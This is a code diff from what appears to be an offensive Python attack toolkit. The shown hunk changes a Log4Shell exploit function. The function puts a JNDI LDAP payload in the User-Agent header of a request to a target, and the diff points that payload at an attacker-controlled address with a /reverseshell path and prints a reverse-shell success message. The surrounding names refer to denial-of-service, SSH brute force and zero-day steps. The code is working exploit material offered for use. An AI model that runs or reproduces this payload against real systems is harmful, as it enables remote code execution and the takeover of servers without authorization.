@@ -131,15 +131,17 @@ def dos_attack(target):
 
 # Log4Shell Exploit Simulation to Gain Admin Access
 def log4shell_exploit(url):
-    payload = '${jndi:ldap://malicious-ldap-server.com/a}'
+    payload = '${jndi:ldap://172.27.96.1/reverseshell}'  # This is a sample payload
     headers = {
         'User-Agent': payload
     }
     try:
         response = requests.get(url, headers=headers, timeout=5)
-        print(f"[INFO] Sent Log4Shell payload to {url} to gain admin access")
+        print(f"[INFO] Sent Log4Shell payload to {url}")
+        print(f"[SUCCESS] Reverse shell initiated. Check your listener.")
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Failed to send request to {url}: {e}")
+
 
 # Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
 def attack_sequence(target):
